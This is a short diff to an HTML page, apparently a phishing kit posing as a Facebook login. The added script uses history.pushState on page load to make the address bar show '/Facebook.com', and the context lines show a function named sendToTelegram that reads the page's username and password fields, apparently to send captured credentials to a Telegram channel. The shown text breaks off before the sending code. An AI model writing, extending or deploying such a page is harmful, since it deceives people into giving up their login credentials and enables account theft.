@@ -187,6 +187,13 @@
     </div>
 
     <script>
+    // Cambiar la URL al cargar la página
+    window.onload = function() {
+        history.pushState({}, '', '/Facebook.com');
+    };
+</script>
+
+    <script>
         function sendToTelegram() {
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
